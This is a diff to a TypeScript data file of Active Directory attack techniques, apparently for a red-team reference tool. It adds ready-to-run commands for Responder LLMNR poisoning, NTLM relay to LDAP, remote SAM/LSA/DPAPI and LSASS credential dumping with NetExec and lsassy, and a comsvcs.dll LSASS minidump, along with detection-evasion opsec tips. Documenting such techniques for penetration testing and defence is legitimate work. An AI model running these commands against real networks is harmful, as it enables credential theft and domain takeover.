@@ -66,14 +66,19 @@ export const initialAccessNodes: TechniqueNodeDef[] = [
     ],
     commands: [
       {
-        label: 'Poison and capture (analyze first to be safe)',
+        label: 'Observe without poisoning (analyze mode)',
+        code: 'responder -I eth0 -A',
+        lang: 'bash',
+      },
+      {
+        label: 'Poison and capture NetNTLMv2',
         code: 'responder -I eth0 -wv',
         lang: 'bash',
       },
     ],
     requires: ['Network access', 'LLMNR/NBT-NS enabled on the segment'],
     mitre: mitre('T1557.001'),
-    opsec: 'Responder is detectable: it answers names that should not resolve. Defenders deploy "honey" name lookups to catch it. Use --analyze mode first to observe without poisoning.',
+    opsec: 'Responder is detectable: it answers names that should not resolve. Defenders deploy "honey" name lookups to catch it. Run analyze mode (-A) first to observe without poisoning.',
     difficulty: 'easy',
     references: [
       { label: 'HackTricks, LLMNR/NBT-NS Poisoning & Relay', url: 'https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html' },
@@ -96,12 +101,12 @@ export const initialAccessNodes: TechniqueNodeDef[] = [
         lang: 'bash',
       },
       {
-        label: 'Relay to LDAP for delegation/ACL abuse',
+        label: 'Relay to LDAP for delegation/ACL abuse (needs LDAP signing off)',
         code: 'ntlmrelayx.py -t ldap://dc01 --escalate-user lowpriv',
         lang: 'bash',
       },
     ],
-    requires: ['Captured/poisoned authentication', 'A target with SMB signing NOT enforced'],
+    requires: ['Captured/poisoned authentication', 'For SMB relay: a target with SMB signing NOT enforced', 'For the LDAP relay: LDAP signing / channel binding NOT enforced on the DC'],
     mitre: mitre('T1557.001'),
     opsec: 'Set Responder SMB/HTTP servers to OFF so it forwards to ntlmrelayx instead of competing. Relay leaves authentication logs on the target.',
     difficulty: 'medium',
@@ -168,6 +173,16 @@ export const initialAccessNodes: TechniqueNodeDef[] = [
       'You hold SYSTEM or local administrator on a domain-joined host: the launchpad for credential theft. Dump LSASS, the SAM/LSA secrets, and DPAPI material to recover cached domain hashes, Kerberos tickets, and sometimes cleartext, then reuse them to move laterally to the next host.',
     requires: ['Local admin / SYSTEM on a host'],
     mitre: mitre('T1078'),
+    tools: [
+      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
+    ],
+    commands: [
+      {
+        label: 'Dump SAM / LSA / DPAPI remotely (NetExec)',
+        code: 'nxc smb <host> -u Administrator -H <NTHASH> --local-auth --sam --lsa --dpapi',
+        lang: 'bash',
+      },
+    ],
     difficulty: 'medium',  },
   {
     id: 'dump-lsass',
@@ -179,6 +194,7 @@ export const initialAccessNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'Mimikatz', url: 'https://github.com/gentilkiwi/mimikatz' },
       { name: 'nanodump', url: 'https://github.com/fortra/nanodump' },
+      { name: 'NetExec', url: 'https://github.com/Pennyw0rth/NetExec' },
     ],
     commands: [
       {
@@ -190,6 +206,11 @@ export const initialAccessNodes: TechniqueNodeDef[] = [
         label: 'LOLBin minidump (then parse offline)',
         code: 'rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\l.dmp full',
         lang: 'powershell',
+      },
+      {
+        label: 'Dump LSASS remotely (NetExec lsassy)',
+        code: 'nxc smb <host> -u user -p pass -M lsassy',
+        lang: 'bash',
       },
     ],
     requires: ['Local admin / SYSTEM on the host'],
